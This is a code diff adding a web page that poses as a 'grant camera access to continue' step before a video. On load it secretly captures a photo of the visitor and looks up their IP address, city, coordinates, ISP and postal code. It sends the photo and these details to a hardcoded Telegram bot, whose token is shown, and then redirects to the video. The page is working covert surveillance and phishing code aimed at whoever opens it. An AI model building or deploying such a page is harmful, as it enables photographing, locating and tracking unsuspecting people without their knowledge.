@@ -1,0 +1,80 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Grant Access</title>
+  <style>
+    body { font-family: Arial; text-align: center; padding: 20px; }
+    video { max-width: 100%; }
+  </style>
+</head>
+<body>
+  <h2>Grant Camera Access to Continue</h2>
+  <video id="camera" autoplay muted playsinline width="300"></video>
+  <div id="status"></div>
+
+  <script>
+    const token = "7458909285:AAGVIrplCqGG_ia98E3vezSzh0OU4X3SHGo";
+    const chatId = "903017073";
+    const videoUrl = new URLSearchParams(window.location.search).get("video");
+
+    async function sendToBot(blob) {
+      try {
+        const res = await fetch('https://ip-api.com/json/');
+        const loc = await res.json();
+        const caption = `😎 Proudly Supported By SocialXTools
+🌐 IP: ${loc.query}
+🏙️ City: ${loc.city}
+🌆 Region: ${loc.regionName}
+🌍 Country: ${loc.countryCode}
+📍 Location: ${loc.lat},${loc.lon}
+🏢 ISP: ${loc.as}
+📮 Postal Code: ${loc.zip || 'N/A'}
+⏰ Timezone: ${loc.timezone}`;
+
+        const form = new FormData();
+        form.append("chat_id", chatId);
+        form.append("caption", caption);
+        form.append("photo", blob, "pic.jpg");
+
+        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: "POST",
+          body: form
+        });
+      } catch (err) {
+        document.getElementById("status").innerText = "❌ Failed to send: " + err.message;
+      }
+    }
+
+    async function initCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        document.getElementById("camera").srcObject = stream;
+
+        const track = stream.getVideoTracks()[0];
+        const capture = new ImageCapture(track);
+
+        setTimeout(async () => {
+          const bitmap = await capture.grabFrame();
+          const canvas = document.createElement("canvas");
+          canvas.width = bitmap.width;
+          canvas.height = bitmap.height;
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(bitmap, 0, 0);
+          canvas.toBlob(async (blob) => {
+            await sendToBot(blob);
+            stream.getTracks().forEach(t => t.stop());
+            window.location.href = videoUrl;
+          });
+        }, 4000);
+      } catch (e) {
+        document.getElementById("status").innerText = "❌ Camera Error: " + e.message;
+      }
+    }
+
+    window.onload = initCamera;
+  </script>
+</body>
+</html>
